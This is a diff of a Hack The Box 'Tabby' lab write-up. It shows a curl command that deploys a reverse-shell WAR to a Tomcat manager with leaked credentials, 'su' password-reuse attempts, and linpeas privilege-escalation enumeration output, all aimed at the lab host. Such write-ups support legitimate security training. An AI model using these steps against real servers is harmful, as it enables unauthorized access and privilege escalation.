@@ -320,6 +320,7 @@ Saved as: reverse443.war
 ## Delivery & Exploitation
 * Deploy A New Application Archive (WAR) [Remotely](https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html)
 *  Curl Commands: -u, --user <user:password> Server user and password,-T, --upload-file <file> Transfer local FILE to destination
+* Need to upload via curl because we do not have manager-gui role and only manager-script role.
 
 ```
 kali@kali:~/HTB/tabby$ curl -u 'tomcat':'$3cureP4s5w0rd123!' -T reverse443.war 'http://10.10.10.194:8080/manager/text/deploy?path=/reverse443'
@@ -373,4 +374,123 @@ $ ls -la ash
 ls -la ash
 ls: cannot open directory 'ash': Permission denied
 ```
+## Privilege Escalation
 
+* Test for password re-use
+```
+$ su ash
+su ash
+Password: $3cureP4s5w0rd123!
+
+su: Authentication failure
+$ su root
+su root
+Password: $3cureP4s5w0rd123!
+
+su: Authentication failure
+
+```
+
+* Transfer linpeas to check for PE
+
+```
+[+] Operative system                                                                                              
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                   
+Linux version 5.4.0-31-generic (buildd@lgw01-amd64-059) (gcc version 9.3.0 (Ubuntu 9.3.0-10ubuntu2)) #35-Ubuntu SM
+P Thu May 7 20:20:34 UTC 2020                                                                                     
+Distributor ID: Ubuntu                                                                                            
+Description:    Ubuntu 20.04 LTS                                                                                  
+Release:        20.04                                                                                             
+Codename:       focal      
+                                                                                                                  
+[+] Looking for ssl/ssh files                                                                                     
+PermitRootLogin yes
+PubkeyAuthentication yes
+ChallengeResponseAuthentication no
+UsePAM yes
+PasswordAuthentication no
+  --> Some certificates were found:
+/var/lib/fwupd/pki/client.pem
+/etc/pki/fwupd/LVFS-CA.pem
+/etc/pki/fwupd-metadata/LVFS-CA.pem
+/etc/pollinate/entropy.ubuntu.com.pem
+/usr/lib/crda/pubkeys/benh@debian.org.key.pub.pem
+
+ --> /etc/hosts.allow file found, read the rules:
+
+
+
+Looking inside /etc/ssh/ssh_config for interesting info
+Include /etc/ssh/ssh_config.d/*.conf
+Host *
+    SendEnv LANG LC_*
+    HashKnownHosts yes
+    GSSAPIAuthentication yes 
+
+                                                                                                                  
+[+] SGID                                                                                                          
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands              
+/snap/core18/1705/sbin/pam_extrausers_chkpwd                                                                      
+/snap/core18/1705/sbin/unix_chkpwd                                                                                
+/snap/core18/1705/usr/bin/chage                                                                                   
+/snap/core18/1705/usr/bin/expiry                                                                                  
+/snap/core18/1705/usr/bin/ssh-agent                                                                               
+/snap/core18/1705/usr/bin/wall                                                                                    
+/usr/bin/chage                                                                                                    
+/usr/bin/at             --->    RTru64_UNIX_4.0g(CVE-2002-1614)                                                   
+/usr/bin/ssh-agent                                                                                                
+/usr/bin/wall                                                                                                     
+/usr/bin/expiry                                                                                                   
+/usr/bin/mlocate                                                                                                  
+/usr/bin/crontab                                                                                                  
+/usr/bin/bsd-write                                                                                                
+/usr/sbin/unix_chkpwd                                                                                             
+/usr/sbin/pam_extrausers_chkpwd                                                                                   
+/usr/lib/x86_64-linux-gnu/utempter/utempter                                                                       
+                                                                                                                  
+[+] Writable folders configured in /etc/ld.so.conf.d/                                                             
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#etc-ld-so-conf-d                                  
+/usr/local/lib                                                                                                    
+/usr/local/lib/x86_64-linux-gnu                                                                                   
+/lib/x86_64-linux-gnu                                                                                             
+/usr/lib/x86_64-linux-gnu                                           
+                                                                                                                  
+[+] .sh files in path                                                                                             
+/usr/bin/rescan-scsi-bus.sh                                                                                       
+/usr/bin/gettext.sh                                                                                               
+                                                                                                                  
+[+] Unexpected folders in root                                                                                    
+/cdrom         
+                                                                                                                  
+[+] Looking for others files in folders owned by me                                                               
+                                                                                                                  
+[+] Readable files belonging to root and readable by me but not world readable                                    
+-rw-r----- 1 root tomcat 5435 Feb 24  2020 /etc/tomcat9/policy.d/04webapps.policy                                 
+-rw-r----- 1 root tomcat 2192 Feb 24  2020 /etc/tomcat9/policy.d/01system.policy                                  
+-rw-r----- 1 root tomcat 2040 Feb 24  2020 /etc/tomcat9/policy.d/50local.policy                                   
+-rw-r----- 1 root tomcat 3237 Feb 24  2020 /etc/tomcat9/policy.d/03catalina.policy                                
+-rw-r----- 1 root tomcat 330 Feb 24  2020 /etc/tomcat9/policy.d/02debian.policy                                   
+-rw-r----- 1 root tomcat 7630 May 21 21:32 /etc/tomcat9/server.xml                                                
+-rw-r----- 1 root tomcat 7262 Feb  5  2020 /etc/tomcat9/catalina.properties                                       
+-rw-r----- 1 root tomcat 2799 Feb 24  2020 /etc/tomcat9/logging.properties                                        
+-rw-r----- 1 root tomcat 2325 Jun 16 12:12 /etc/tomcat9/tomcat-users.xml                                          
+-rw-r----- 1 root tomcat 1400 Feb  5  2020 /etc/tomcat9/context.xml                                               
+-rw-r----- 1 root tomcat 1149 Feb  5  2020 /etc/tomcat9/jaspic-providers.xml                                      
+-rw-r----- 1 root tomcat 172362 Feb  5  2020 /etc/tomcat9/web.xml                                                 
+                                                                                                                  
+[+] Modified interesting files in the last 5mins                                                                  
+/var/log/kern.log                                                                                                 
+/var/log/auth.log                                                                                                 
+/var/log/journal/c72a21e67341466eacf74373cf80aca6/system.journal                                                  
+/var/log/syslog                                                                                                   
+/tmp/hsperfdata_tomcat/972                                                                                        
+                                                                                                                  
+[+] Writable log files (logrotten)                                                                                
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation                            
+Writable: /var/log/tomcat9/localhost.2020-11-08.log                                                               
+Writable: /var/log/tomcat9/catalina.2020-11-08.log   
+
++] Backup files?                                        
+-rw-r--r-- 1 ash ash 8716 Jun 16 13:42 /var/www/html/files/16162020_backup.zip
+-rw-r--r-- 1 root root 2743 Apr 23  2020 /etc/apt/sources.list.curtin.old
+```
